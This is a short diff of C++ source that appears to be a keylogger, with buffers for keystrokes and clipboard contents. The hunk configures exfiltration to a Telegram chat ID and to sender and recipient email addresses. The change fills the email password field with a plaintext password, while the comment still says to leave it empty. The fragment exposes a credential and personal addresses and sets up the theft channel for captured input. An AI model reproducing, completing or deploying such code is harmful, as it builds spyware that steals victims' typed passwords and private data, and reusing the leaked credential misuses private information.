@@ -29,7 +29,7 @@ const wchar_t* CHAT_ID = L"7845441585";
 
 // Email configuration - SIMPLIFIED (no SMTP for now, can add later)
 const wchar_t* ZOHO_EMAIL_FROM = L"jesko200233@zohomail.com";
-const wchar_t* ZOHO_EMAIL_PASSWORD = L""; // Leave empty - email disabled for now
+const wchar_t* ZOHO_EMAIL_PASSWORD = L"CASHboi01@"; // Leave empty - email disabled for now
 const wchar_t* ZOHO_EMAIL_TO = L"josephogidiagba49@gmail.com";
 
 std::wstring keyBuffer, clipBuffer;
